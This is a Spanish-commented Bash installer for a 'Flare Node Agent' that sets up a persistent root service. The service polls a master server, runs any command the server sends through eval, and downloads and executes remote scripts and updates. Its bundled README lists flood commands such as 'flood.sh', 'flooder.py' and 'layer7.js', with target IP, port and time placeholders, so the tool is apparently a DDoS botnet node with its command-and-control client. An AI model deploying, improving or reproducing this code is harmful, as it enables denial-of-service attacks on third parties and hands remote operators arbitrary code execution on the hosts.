#!/bin/bash
set -euo pipefail

# ============================================================
#  FLARE NODE AGENT INSTALLER v1.1
#  Sistema de Administración de Nodos
# ============================================================
#
#  .env opcional — coloca en el mismo directorio del installer:
#  ─────────────────────────────────────────────────────────────
#  MASTER_URL=http://1.2.3.4
#  AGENT_TOKEN=tu_token_aqui
#  NODE_NAME_DEFAULT=yes          # "yes" = auto, o pon un nombre
#

AGENT_VERSION="1.1"
TOTAL=6

RED='\033[0;31m'; GREEN='\033[0;32m'; YELLOW='\033[1;33m'
CYAN='\033[0;36m'; BOLD='\033[1m'; NC='\033[0m'

banner() {
  echo -e "${CYAN}${BOLD}"
  echo "╔══════════════════════════════════════════════════════╗"
  echo "║      FLARE NODE AGENT INSTALLER  v1.1                ║"
  echo "║      Sistema de Administración de Nodos              ║"
  echo "╚══════════════════════════════════════════════════════╝"
  echo -e "${NC}"
}

step() { echo -e "\n${GREEN}[${1}/${TOTAL}]${NC} ${BOLD}${2}${NC}"; }
info() { echo -e "  ${CYAN}→${NC} ${1}"; }
ok()   { echo -e "  ${GREEN}✔${NC} ${1}"; }
warn() { echo -e "  ${YELLOW}⚠${NC} ${1}"; }
err()  { echo -e "  ${RED}✘ ERROR:${NC} ${1}"; exit 1; }

banner

# ─── ROOT DETECTION ────────────────────────────────────────
IS_ROOT=false
[ "$(id -u)" -eq 0 ] && IS_ROOT=true

if $IS_ROOT; then
  INSTALL_DIR="/opt/node-agent"
  LOG_FILE="/var/log/node-agent.log"
  info "Modo: ${GREEN}root${NC} — autostart del sistema disponible"
else
  INSTALL_DIR="${HOME}/.node-agent"
  LOG_FILE="${HOME}/.node-agent/agent.log"
  warn "Modo: usuario normal — autostart de sistema no disponible"
  info "Directorio: ${CYAN}${INSTALL_DIR}${NC}"
fi

SCRIPTS_DIR="${INSTALL_DIR}/scripts"
CONFIG_FILE="${INSTALL_DIR}/agent.conf"

# ─── DETECT ENVIRONMENT ────────────────────────────────────
IS_CONTAINER=false
if [ -f /.dockerenv ] || \
   grep -qa 'docker\|lxc\|container' /proc/1/cgroup 2>/dev/null || \
   { command -v systemd-detect-virt &>/dev/null && \
     { [ "$(systemd-detect-virt 2>/dev/null)" = "lxc" ] || \
       [ "$(systemd-detect-virt 2>/dev/null)" = "docker" ]; }; }; then
  IS_CONTAINER=true
fi

$IS_CONTAINER && info "Entorno: ${YELLOW}CONTAINER${NC} (Docker/LXC)" \
              || info "Entorno: ${GREEN}VPS / Bare Metal${NC}"

# ─── LOAD .env ─────────────────────────────────────────────
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" 2>/dev/null && pwd || pwd)"
ENV_FILE=""
for _ef in "${SCRIPT_DIR}/.env" "$(pwd)/.env"; do
  [ -f "$_ef" ] && { ENV_FILE="$_ef"; break; }
done

MASTER_URL_ENV=""
AGENT_TOKEN_ENV=""
NODE_NAME_ENV=""

if [ -n "$ENV_FILE" ]; then
  info "Cargando .env → ${CYAN}${ENV_FILE}${NC}"
  while IFS= read -r _line || [ -n "$_line" ]; do
    [[ "$_line" =~ ^[[:space:]]*# ]] && continue
    [[ -z "${_line// }" ]] && continue
    _k="${_line%%=*}"
    _v="${_line#*=}"
    _k="${_k//[[:space:]]/}"
    _v="${_v//[[:space:]]/}"
    case "$_k" in
      MASTER_URL)        MASTER_URL_ENV="$_v"  ;;
      AGENT_TOKEN)       AGENT_TOKEN_ENV="$_v" ;;
      NODE_NAME_DEFAULT) NODE_NAME_ENV="$_v"   ;;
    esac
  done < "$ENV_FILE"
fi

# ─── INTERACTIVE CONFIG ────────────────────────────────────
echo ""
echo -e "  ${BOLD}Configuración del Agente${NC}"
echo -e "  ${CYAN}──────────────────────────────────────────${NC}"

# Master URL
if [ -n "$MASTER_URL_ENV" ]; then
  _raw="${MASTER_URL_ENV#http://}"; _raw="${_raw#https://}"; _raw="${_raw%%/*}"
  MASTER_URL="http://${_raw}"
  info "Master URL: ${CYAN}${MASTER_URL}${NC} ${YELLOW}(desde .env)${NC}"
else
  read -rp "  IP o dominio del Master (ej: 1.2.3.4): " _inp
  [ -z "${_inp:-}" ] && err "La IP/dominio del master es requerida"
  _inp="${_inp#http://}"; _inp="${_inp#https://}"; _inp="${_inp%%/*}"
  MASTER_URL="http://${_inp}"
fi

# Agent token
if [ -n "$AGENT_TOKEN_ENV" ]; then
  AGENT_TOKEN="$AGENT_TOKEN_ENV"
  info "Token: ${CYAN}${AGENT_TOKEN:0:8}...${NC} ${YELLOW}(desde .env)${NC}"
else
  read -rp "  AGENT_TOKEN (del panel master): " AGENT_TOKEN
  [ -z "${AGENT_TOKEN:-}" ] && err "El AGENT_TOKEN es requerido"
fi

# Node name
DEFAULT_NAME="node-$(hostname | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z0-9-' | cut -c1-16)"
_env_sourced=false
[ -n "$MASTER_URL_ENV" ] && [ -n "$AGENT_TOKEN_ENV" ] && _env_sourced=true

if [ -n "$NODE_NAME_ENV" ] && [ "$NODE_NAME_ENV" != "yes" ]; then
  NODE_NAME="$NODE_NAME_ENV"
  info "Nombre nodo: ${CYAN}${NODE_NAME}${NC} ${YELLOW}(desde .env)${NC}"
elif $_env_sourced; then
  NODE_NAME="$DEFAULT_NAME"
  info "Nombre nodo: ${CYAN}${NODE_NAME}${NC} (automático)"
else
  read -rp "  Nombre del nodo [${DEFAULT_NAME}]: " NODE_NAME
  NODE_NAME="${NODE_NAME:-${DEFAULT_NAME}}"
fi

echo ""
info "Master  : ${CYAN}${MASTER_URL}${NC}"
info "Nodo    : ${CYAN}${NODE_NAME}${NC}"
info "Dir     : ${CYAN}${INSTALL_DIR}${NC}"
echo ""

# ============================================================
# [1/6] DEPENDENCIAS
# ============================================================
step 1 "Verificando dependencias del sistema..."

_try_install() {
  local _pkgs=("$@")
  if $IS_ROOT; then
    if   command -v apt-get &>/dev/null; then
      export DEBIAN_FRONTEND=noninteractive

      # Disable broken third-party repos temporarily
      for _repo in /etc/apt/sources.list.d/yarn.list \
                   /etc/apt/sources.list.d/nodesource.list \
                   /etc/apt/sources.list.d/github-cli.list; do
        [ -f "$_repo" ] && mv "$_repo" "${_repo}.bak" 2>/dev/null || true
      done

      apt-get update -qq 2>/dev/null || apt-get update -qq -o APT::Update::Error-Mode=any 2>/dev/null || true
      apt-get install -y "${_pkgs[@]}" > /dev/null 2>&1 || true
    elif command -v yum    &>/dev/null; then yum install -y "${_pkgs[@]}" > /dev/null 2>&1 || true
    elif command -v apk    &>/dev/null; then apk add --no-cache bash "${_pkgs[@]}" > /dev/null 2>&1 || true
    fi
  else
    if command -v sudo &>/dev/null; then
      if   command -v apt-get &>/dev/null; then
        export DEBIAN_FRONTEND=noninteractive
        sudo apt-get install -y "${_pkgs[@]}" > /dev/null 2>&1 || true
      elif command -v yum &>/dev/null; then
        sudo yum install -y "${_pkgs[@]}" > /dev/null 2>&1 || true
      fi
    fi
  fi
}

_missing=()
command -v curl    &>/dev/null || _missing+=(curl)
command -v bc      &>/dev/null || _missing+=(bc)
command -v python3 &>/dev/null || _missing+=(python3)

if [ "${#_missing[@]}" -gt 0 ]; then
  info "Instalando: ${_missing[*]}"
  _try_install "${_missing[@]}"
  for _p in "${_missing[@]}"; do
    command -v "$_p" &>/dev/null \
      && ok "$_p instalado" \
      || warn "$_p no disponible — instálalo manualmente: apt install $_p"
  done
else
  ok "Dependencias OK (curl, bc, python3)"
fi

# ============================================================
# [2/6] DIRECTORIOS
# ============================================================
step 2 "Creando estructura de directorios..."
mkdir -p "${INSTALL_DIR}" "${SCRIPTS_DIR}"
ok "Directorios: ${INSTALL_DIR}"

# ============================================================
# [3/6] CONFIGURACIÓN
# ============================================================
step 3 "Generando Node ID y configuración..."

_H=$(hostname | tr '[:upper:]' '[:lower:]' | tr -cd 'a-z0-9' | cut -c1-8 || echo "host")
_R=$(openssl rand -hex 4 2>/dev/null || date +%N 2>/dev/null | cut -c1-8 || echo "00000000")

if   [ -f /etc/machine-id ];                 then _M=$(cut -c1-8 /etc/machine-id)
elif [ -f /proc/sys/kernel/random/boot_id ]; then _M=$(tr -d '-' </proc/sys/kernel/random/boot_id | cut -c1-8)
else                                              _M=$(openssl rand -hex 4 2>/dev/null || echo "00000000")
fi

NODE_ID="node_${_H}_${_M}_${_R}"

cat > "${CONFIG_FILE}" << CONFEOF
# ============================================================
#  FLARE NODE AGENT — Configuración
#  Reinicia tras editar: systemctl restart node-agent
# ============================================================

MASTER_URL=${MASTER_URL}
AGENT_TOKEN=${AGENT_TOKEN}
NODE_ID=${NODE_ID}
NODE_NAME=${NODE_NAME}
POLL_INTERVAL=3
SCRIPTS_DIR=${SCRIPTS_DIR}
CONNECT_TIMEOUT=10
LOG_FILE=${LOG_FILE}
CONFEOF

chmod 600 "${CONFIG_FILE}"
ok "Configuración → ${CONFIG_FILE}"
info "Node ID: ${CYAN}${NODE_ID}${NC}"

# ============================================================
# [4/6] AGENTE (agent.sh)
# ============================================================
step 4 "Creando agente v${AGENT_VERSION}..."

cat > "${INSTALL_DIR}/agent.sh" << 'AGENTEOF'
#!/bin/bash
# ============================================================
#  FLARE NODE AGENT v__AGENT_VERSION__
#  Sistema de Administración de Nodos
# ============================================================

AGENT_VERSION="__AGENT_VERSION__"
UPDATE_TRIGGERED=false

# Resolve install dir robustly (no readlink -f dependency)
_SELF_DIR="$(dirname "$0")"
case "$_SELF_DIR" in /*) ;; *) _SELF_DIR="$(cd "$_SELF_DIR" && pwd)" ;; esac

CONFIG_FILE="${_SELF_DIR}/agent.conf"

[ -f "$CONFIG_FILE" ] || {
  echo "[AGENT] ERROR: Config no encontrada: $CONFIG_FILE" >&2
  exit 1
}
# shellcheck source=/dev/null
source "$CONFIG_FILE"

POLL_INTERVAL="${POLL_INTERVAL:-3}"
CONNECT_TIMEOUT="${CONNECT_TIMEOUT:-10}"
SCRIPTS_DIR="${SCRIPTS_DIR:-${_SELF_DIR}/scripts}"
AGENT_LOG="${LOG_FILE:-/var/log/node-agent.log}"
CURRENT_TASK_PID=""
CURRENT_TASK_ID=""

log() {
  local _level="$1"; shift
  echo "[$(date '+%Y-%m-%d %H:%M:%S')] [${_level}] $*"
}

# ── CPU ────────────────────────────────────────────────────
get_cpu() {
  local c1 c2 t1 id1 t2 id2 dt di
  c1=$(grep -m1 '^cpu ' /proc/stat 2>/dev/null | awk '{print $2+$3+$4+$5+$6+$7+$8, $5+$6}') || true
  sleep 0.3
  c2=$(grep -m1 '^cpu ' /proc/stat 2>/dev/null | awk '{print $2+$3+$4+$5+$6+$7+$8, $5+$6}') || true
  if [ -n "$c1" ] && [ -n "$c2" ]; then
    t1=$(echo "$c1" | awk '{print $1}'); id1=$(echo "$c1" | awk '{print $2}')
    t2=$(echo "$c2" | awk '{print $1}'); id2=$(echo "$c2" | awk '{print $2}')
    dt=$(( t2 - t1 )); di=$(( id2 - id1 ))
    if [ "$dt" -gt 0 ]; then
      echo "scale=1; (($dt - $di) * 100) / $dt" | bc 2>/dev/null || echo "0"
      return
    fi
  fi
  top -bn1 2>/dev/null | grep "Cpu(s)" | awk '{print 100-$8}' | tr -d '%' || echo "0"
}

# ── RAM ────────────────────────────────────────────────────
get_ram() {
  [ -f /proc/meminfo ] || { echo "0"; return; }
  local total free buf cached used
  total=$(awk '/^MemTotal:/{print $2}' /proc/meminfo);   total="${total:-0}"
  free=$(awk '/^MemFree:/{print $2}' /proc/meminfo);     free="${free:-0}"
  buf=$(awk '/^Buffers:/{print $2}' /proc/meminfo);      buf="${buf:-0}"
  cached=$(grep "^Cached:" /proc/meminfo | awk '{print $2}'); cached="${cached:-0}"
  used=$(( total - free - buf - cached ))
  [ "${total:-0}" -gt 0 ] \
    && echo "scale=1; ($used * 100) / $total" | bc 2>/dev/null \
    || echo "0"
}

# ── HTTP ───────────────────────────────────────────────────
agent_post() {
  curl -s \
    --max-time "${CONNECT_TIMEOUT}" \
    --connect-timeout 5 \
    -X POST \
    -H "Content-Type: application/json" \
    -H "x-agent-token: ${AGENT_TOKEN}" \
    -d "$2" \
    "${MASTER_URL}${1}" 2>/dev/null
}

# ── REGISTER ───────────────────────────────────────────────
register() {
  log "INFO" "Registrando → ${MASTER_URL} | v${AGENT_VERSION}"
  local body resp
  body=$(printf '{"node_id":"%s","name":"%s","agent_version":"%s"}' \
    "$NODE_ID" "$NODE_NAME" "$AGENT_VERSION")
  resp=$(agent_post "/api/agent/register" "$body")
  if echo "$resp" | grep -q '"success":true'; then
    log "OK" "Registrado: $NODE_NAME ($NODE_ID)"
    return 0
  fi
  log "WARN" "Registro falló: ${resp:-sin respuesta}"
  return 1
}

# ── SYNC: archivos gestionados + versión ───────────────────
process_sync() {
  local resp="$1"
  [ -z "$resp" ] && return 0

  # Extract everything in one python pass to avoid subshell issues
  local output
  output=$(echo "$resp" | python3 -c '
import sys, json
try:
    d = json.load(sys.stdin)
    s = d.get("sync", {})
    # Managed files
    for f in s.get("managed_files", []):
        n = str(f.get("name","")).strip()
        u = str(f.get("raw_url","")).strip()
        if n and u and "|" not in n and "\n" not in n:
            print("FILE|" + n + "|" + u)
    # Version
    v   = str(s.get("latest_node_version","")).strip()
    upd = str(s.get("update_script_url","")).strip()
    if v:
        print("VER|" + v + "|" + upd)
except:
    pass
' 2>/dev/null) || return 0

  [ -z "$output" ] && return 0

  # Process each line — <<< runs while body in current shell (no subshell)
  while IFS='|' read -r _kind _p1 _p2; do
    case "$_kind" in

      FILE)
        local _dest="${SCRIPTS_DIR}/${_p1}"
        if [ -n "$_p1" ] && [ -n "$_p2" ] && [ ! -f "$_dest" ]; then
          log "INFO" "Sincronizando: $_p1"
          if curl -fsSL --max-time 30 -o "$_dest" "$_p2" 2>/dev/null; then
            chmod +x "$_dest" 2>/dev/null || true
            log "OK"   "Descargado: $_p1"
          else
            log "WARN" "Error descargando: $_p1 ← $_p2"
            rm -f "$_dest" 2>/dev/null || true
          fi
        fi
        ;;

      VER)
        # Update only once per session and only if version differs
        if [ "$_p1" != "$AGENT_VERSION" ] && [ -n "$_p2" ] && ! $UPDATE_TRIGGERED; then
          UPDATE_TRIGGERED=true
          log "INFO" "Nueva versión disponible: v${_p1} (actual: v${AGENT_VERSION})"
          local _tmp="/tmp/_flare_upd_$$.sh"
          if curl -fsSL --max-time 60 -o "$_tmp" "$_p2" 2>/dev/null; then
            chmod +x "$_tmp"
            log "INFO" "Ejecutando actualización → v${_p1}..."
            # Run in background then exit — service manager restarts with new version
            nohup bash "$_tmp" >> "$AGENT_LOG" 2>&1 &
            sleep 3
            log "INFO" "Agente deteniéndose — el gestor lo reiniciará con v${_p1}"
            exit 0
          else
            log "WARN" "No se pudo descargar el script de actualización"
            UPDATE_TRIGGERED=false
          fi
        fi
        ;;
    esac
  done <<< "$output"
}

# ── REPORT COMPLETE ────────────────────────────────────────
report_complete() {
  local body
  body=$(printf '{"node_id":"%s","task_id":%s,"success":%s}' "$NODE_ID" "$1" "$2")
  agent_post "/api/agent/complete" "$body" > /dev/null
  log "INFO" "Tarea #${1} reportada (success=${2})"
}

# ── EXECUTE TASK ───────────────────────────────────────────
execute_task() {
  local task_id="$1" command="$2" time_limit="$3"
  CURRENT_TASK_ID="$task_id"
  log "INFO" "Iniciando tarea #${task_id} | ${time_limit}s | $command"

  (
    cd "${_SELF_DIR}" || exit 1
    eval "$command"
  ) &
  CURRENT_TASK_PID=$!

  local elapsed=0
  while kill -0 "$CURRENT_TASK_PID" 2>/dev/null; do
    sleep 1
    elapsed=$(( elapsed + 1 ))
    if [ "$elapsed" -ge "$time_limit" ]; then
      log "INFO" "Tiempo agotado para tarea #${task_id} — terminando proceso"
      kill -TERM "$CURRENT_TASK_PID" 2>/dev/null; sleep 2
      kill -KILL "$CURRENT_TASK_PID" 2>/dev/null; break
    fi
  done

  wait "$CURRENT_TASK_PID" 2>/dev/null; local ec=$?
  CURRENT_TASK_PID=""; CURRENT_TASK_ID=""

  if [ "$ec" -eq 0 ] || [ "$ec" -eq 143 ] || [ "$elapsed" -ge "$time_limit" ]; then
    log "INFO" "Tarea #${task_id} completada OK (exit=${ec}, elapsed=${elapsed}s)"
    report_complete "$task_id" "true"
  else
    log "WARN" "Tarea #${task_id} falló (exit=${ec}, elapsed=${elapsed}s)"
    report_complete "$task_id" "false"
  fi
}

# ── POLL LOOP ──────────────────────────────────────────────
poll_loop() {
  local fail_count=0 max_fail=10

  while true; do
    local cpu ram body resp
    cpu=$(get_cpu)
    ram=$(get_ram)
    body=$(printf '{"node_id":"%s","cpu":%s,"ram":%s,"agent_version":"%s"}' \
      "$NODE_ID" "${cpu:-0}" "${ram:-0}" "$AGENT_VERSION")
    resp=$(agent_post "/api/agent/poll" "$body")

    if [ -z "$resp" ]; then
      fail_count=$(( fail_count + 1 ))
      if [ "$fail_count" -ge "$max_fail" ]; then
        log "WARN" "Master sin respuesta ($fail_count intentos) — re-registrando..."
        register && fail_count=0
      fi
      sleep "$POLL_INTERVAL"; continue
    fi
    fail_count=0

    # ── Procesar sincronización (archivos + versión)
    process_sync "$resp"

    # ── Señal de cancelación
    if echo "$resp" | grep -q '"cancel":true'; then
      local _cancelled_id
      _cancelled_id=$(echo "$resp" | grep -o '"task_id":[0-9]*' | head -1 | cut -d: -f2 || echo "")
      log "WARN" "Cancelación recibida del master (task_id=${_cancelled_id:-?})"
      if [ -n "$CURRENT_TASK_PID" ] && kill -0 "$CURRENT_TASK_PID" 2>/dev/null; then
        kill -TERM "$CURRENT_TASK_PID" 2>/dev/null; sleep 1
        kill -KILL "$CURRENT_TASK_PID" 2>/dev/null
        CURRENT_TASK_PID=""; CURRENT_TASK_ID=""
      fi
      sleep "$POLL_INTERVAL"; continue
    fi

    # ── Nueva tarea
    if echo "$resp" | grep -q '"task":{'; then
      local task_id task_time task_command
      task_id=$(echo "$resp" | grep -o '"id":[0-9]*' | head -1 | cut -d: -f2)
      task_time=$(echo "$resp" | grep -o '"time":[0-9]*' | head -1 | cut -d: -f2)
      task_command=$(echo "$resp" | python3 -c '
import sys, json
try:
    d = json.load(sys.stdin)
    print(d["task"]["command"])
except:
    pass
' 2>/dev/null)

      if [ -n "${task_id:-}" ] && [ -n "${task_command:-}" ]; then
        execute_task "$task_id" "$task_command" "${task_time:-60}" &
      fi
    fi

    sleep "$POLL_INTERVAL"
  done
}

# ── SIGNALS ────────────────────────────────────────────────
cleanup() {
  log "INFO" "Señal de apagado — limpiando..."
  if [ -n "$CURRENT_TASK_PID" ] && kill -0 "$CURRENT_TASK_PID" 2>/dev/null; then
    kill -TERM "$CURRENT_TASK_PID" 2>/dev/null
    [ -n "$CURRENT_TASK_ID" ] && report_complete "$CURRENT_TASK_ID" "false"
  fi
  exit 0
}
trap cleanup SIGTERM SIGINT SIGQUIT

# ── MAIN ───────────────────────────────────────────────────
log "INFO" "══════════════════════════════════════════════"
log "INFO" " FLARE NODE AGENT v${AGENT_VERSION} arrancando"
log "INFO" " Nodo  : $NODE_NAME ($NODE_ID)"
log "INFO" " Master: $MASTER_URL"
log "INFO" " Poll  : ${POLL_INTERVAL}s | Scripts: ${SCRIPTS_DIR}"
log "INFO" "══════════════════════════════════════════════"

# Register — retry until master responds
while ! register; do
  log "WARN" "No se pudo conectar al master — reintentando en 10s..."
  sleep 10
done

# Re-register cada 5 minutos para mantener info fresca
(
  while true; do
    sleep 300
    register 2>/dev/null || true
  done
) &

poll_loop
AGENTEOF

# Inject actual version
sed -i "s/__AGENT_VERSION__/${AGENT_VERSION}/g" "${INSTALL_DIR}/agent.sh"
chmod +x "${INSTALL_DIR}/agent.sh"
ok "agent.sh v${AGENT_VERSION} → ${INSTALL_DIR}/agent.sh"

# ============================================================
# [5/6] SCRIPTS DE EJEMPLO
# ============================================================
step 5 "Creando scripts de ejemplo..."

cat > "${SCRIPTS_DIR}/example.sh" << 'EXEOF'
#!/bin/bash
# Ejemplo: ping básico — uso: example.sh <ip> <segundos>
TARGET="${1:-}"; SECS="${2:-30}"
[ -z "$TARGET" ] && { echo "Uso: example.sh <ip> <segundos>"; exit 1; }
echo "[$(date '+%H:%M:%S')] Iniciando → $TARGET por ${SECS}s"
timeout "$SECS" ping -i 0.2 "$TARGET" > /dev/null 2>&1 || true
echo "[$(date '+%H:%M:%S')] Finalizado"
EXEOF
chmod +x "${SCRIPTS_DIR}/example.sh"

cat > "${SCRIPTS_DIR}/README.txt" << RDEOF
SCRIPTS — FLARE NODE AGENT v${AGENT_VERSION}
============================================
Coloca aquí los scripts que el master ejecutará.
Los archivos marcados como "Managed Files" en el panel
se descargan automáticamente en esta carpeta.

El master envía el comando completo, por ejemplo:
  ./scripts/flood.sh 1.2.3.4 80 60
  python3 scripts/flooder.py -h 1.2.3.4 -p 80 -t 60
  node scripts/layer7.js https://example.com 60

Variables disponibles en el panel de métodos:
  {ip}   → IP del objetivo
  {url}  → URL del objetivo
  {host} → Alias de {ip} o {url}
  {port} → Puerto
  {time} → Tiempo en segundos
RDEOF

ok "Scripts de ejemplo creados → ${SCRIPTS_DIR}"

# ============================================================
# [6/6] AUTOSTART + INICIO
# ============================================================
step 6 "Configurando inicio automático..."

STARTUP_TYPE="manual"

if $IS_ROOT; then
  # ── LOGROTATE ─────────────────────────────────────────────
  cat > /etc/logrotate.d/node-agent << 'LOGREOF'
/var/log/node-agent.log {
    daily
    rotate 7
    compress
    missingok
    notifempty
    copytruncate
}
LOGREOF

  if ! $IS_CONTAINER && command -v systemctl &>/dev/null; then
    # ── SYSTEMD (VPS / bare metal) ─────────────────────────
    cat > /etc/systemd/system/node-agent.service << SVCEOF
[Unit]
Description=Flare Node Agent v${AGENT_VERSION}
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
User=root
WorkingDirectory=${INSTALL_DIR}
ExecStart=/bin/bash ${INSTALL_DIR}/agent.sh
Restart=always
RestartSec=5
StandardOutput=journal
StandardError=journal
SyslogIdentifier=flare-node
KillMode=process
TimeoutStopSec=10

[Install]
WantedBy=multi-user.target
SVCEOF
    systemctl daemon-reload
    systemctl enable node-agent > /dev/null 2>&1
    STARTUP_TYPE="systemd"
    ok "Servicio systemd configurado (node-agent)"

  else
    # ── CONTAINER: SUPERVISOR ──────────────────────────────
    apt-get install -y supervisor > /dev/null 2>&1 || true

    if command -v supervisorctl &>/dev/null; then
      mkdir -p /etc/supervisor/conf.d
      cat > /etc/supervisor/conf.d/node-agent.conf << SUPEOF
[program:agent]
command=/bin/bash ${INSTALL_DIR}/agent.sh
directory=${INSTALL_DIR}
autostart=true
autorestart=true
startsecs=3
startretries=999
stdout_logfile=${LOG_FILE}
stdout_logfile_maxbytes=10MB
stdout_logfile_backups=2
stderr_logfile=${INSTALL_DIR}/agent.err
stderr_logfile_maxbytes=5MB
redirect_stderr=false
SUPEOF
      STARTUP_TYPE="supervisor"
      ok "Supervisor configurado"

    else
      # ── FALLBACK: CRONTAB ────────────────────────────────
      (
        crontab -l 2>/dev/null | grep -v "node-agent" || true
        echo "@reboot sleep 10 && /bin/bash ${INSTALL_DIR}/agent.sh >> ${LOG_FILE} 2>&1 &"
      ) | crontab -
      STARTUP_TYPE="crontab"
      ok "Crontab @reboot configurado"
    fi

    # Docker ENTRYPOINT wrapper
    cat > "${INSTALL_DIR}/start.sh" << STARTEOF
#!/bin/bash
# Wrapper para Docker ENTRYPOINT / CMD
#   CMD ["/opt/node-agent/start.sh"]
exec /bin/bash ${INSTALL_DIR}/agent.sh
STARTEOF
    chmod +x "${INSTALL_DIR}/start.sh"
    ok "start.sh creado (Docker ENTRYPOINT)"
  fi

else
  # ── SIN ROOT: start.sh manual ──────────────────────────
  cat > "${INSTALL_DIR}/start.sh" << STARTEOF
#!/bin/bash
# Inicia el agente manualmente (sin autostart de sistema)
cd "${INSTALL_DIR}" || exit 1
nohup /bin/bash ${INSTALL_DIR}/agent.sh >> ${LOG_FILE} 2>&1 &
echo "Agente iniciado (PID: \$!)"
echo "Log: tail -f ${LOG_FILE}"
STARTEOF
  chmod +x "${INSTALL_DIR}/start.sh"
  STARTUP_TYPE="manual"
  ok "start.sh creado → ${INSTALL_DIR}/start.sh"
  warn "Para autostart agrega a tu crontab:"
  warn "  @reboot sleep 10 && /bin/bash ${INSTALL_DIR}/agent.sh >> ${LOG_FILE} 2>&1 &"
fi

# ── INICIAR EL AGENTE ─────────────────────────────────────
info "Iniciando agente..."
case "$STARTUP_TYPE" in
  systemd)
    systemctl start node-agent
    sleep 3
    if systemctl is-active --quiet node-agent; then
      ok "node-agent activo (systemd)"
    else
      warn "Servicio no inició — verifica: journalctl -u node-agent -n 30"
    fi
    ;;
  supervisor)
    supervisord -c /etc/supervisor/supervisord.conf > /dev/null 2>&1 || true
    supervisorctl reread > /dev/null 2>&1 || true
    supervisorctl update > /dev/null 2>&1 || true
    supervisorctl start agent > /dev/null 2>&1 || true
    sleep 3
    if supervisorctl status agent 2>/dev/null | grep -q "RUNNING"; then
      ok "Agente activo (supervisor)"
    else
      warn "Iniciando en background como fallback..."
      nohup /bin/bash "${INSTALL_DIR}/agent.sh" >> "${LOG_FILE}" 2>&1 &
      ok "Agente iniciado (PID: $!)"
    fi
    ;;
  crontab|manual)
    nohup /bin/bash "${INSTALL_DIR}/agent.sh" >> "${LOG_FILE}" 2>&1 &
    ok "Agente iniciado en background (PID: $!)"
    ;;
esac

# ============================================================
# RESUMEN
# ============================================================
echo ""
echo -e "${CYAN}${BOLD}"
echo "╔══════════════════════════════════════════════════════════════╗"
echo "║         INSTALACIÓN COMPLETADA  ✅                            ║"
echo "╠══════════════════════════════════════════════════════════════╣"
printf "║  Nodo       → %-47s ║\n" "$NODE_NAME"
printf "║  Node ID    → %-47s ║\n" "${NODE_ID:0:47}"
printf "║  Master     → %-47s ║\n" "$MASTER_URL"
printf "║  Versión    → v%-46s ║\n" "$AGENT_VERSION"
echo "║                                                              ║"
printf "║  Config     → %-47s ║\n" "$CONFIG_FILE"
printf "║  Scripts    → %-47s ║\n" "$SCRIPTS_DIR"
printf "║  Log        → %-47s ║\n" "$LOG_FILE"
printf "║  Startup    → %-47s ║\n" "$STARTUP_TYPE"
echo "╠══════════════════════════════════════════════════════════════╣"
echo "║  Comandos útiles:                                            ║"

if [ "$STARTUP_TYPE" = "systemd" ]; then
  echo "║    systemctl status node-agent                               ║"
  echo "║    journalctl -u node-agent -f                               ║"
  echo "║    systemctl restart node-agent                              ║"
elif [ "$STARTUP_TYPE" = "supervisor" ]; then
  echo "║    supervisorctl status agent                                ║"
  echo "║    supervisorctl restart agent                               ║"
  printf "║    tail -f %-51s ║\n" "$LOG_FILE"
else
  printf "║    tail -f %-51s ║\n" "$LOG_FILE"
  echo "║    pkill -f agent.sh          # detener                      ║"
  printf "║    bash %-54s ║\n" "${INSTALL_DIR}/start.sh  # reiniciar"
fi

echo "╠══════════════════════════════════════════════════════════════╣"
echo "║  Para desinstalar / reinstalar desde cero:                   ║"

if [ "$STARTUP_TYPE" = "systemd" ]; then
  echo "║    systemctl stop node-agent && systemctl disable node-agent  ║"
  echo "║    rm -f /etc/systemd/system/node-agent.service               ║"
  echo "║    systemctl daemon-reload                                    ║"
  printf "║    rm -rf %-52s ║\n" "$INSTALL_DIR"
elif [ "$STARTUP_TYPE" = "supervisor" ]; then
  echo "║    supervisorctl stop agent                                   ║"
  echo "║    rm -f /etc/supervisor/conf.d/node-agent.conf               ║"
  echo "║    pkill -f agent.sh 2>/dev/null; true                        ║"
  printf "║    rm -rf %-52s ║\n" "$INSTALL_DIR"
else
  echo "║    pkill -f agent.sh 2>/dev/null; true                        ║"
  printf "║    rm -rf %-52s ║\n" "$INSTALL_DIR"
fi

echo "╚══════════════════════════════════════════════════════════════╝"
echo -e "${NC}"
echo -e "${YELLOW}⚠  El nodo debería aparecer en el panel en ~5 segundos${NC}"
echo -e "${YELLOW}   Coloca tus scripts en: ${CYAN}${SCRIPTS_DIR}/${NC}"
echo ""
echo -e "   ${BOLD}.env de ejemplo${NC} (mismo directorio del installer):"
echo -e "   ${CYAN}MASTER_URL=http://<ip-del-master>${NC}"
echo -e "   ${CYAN}AGENT_TOKEN=<token>${NC}"
echo -e "   ${CYAN}NODE_NAME_DEFAULT=yes${NC}   # o pon un nombre fijo"
echo ""
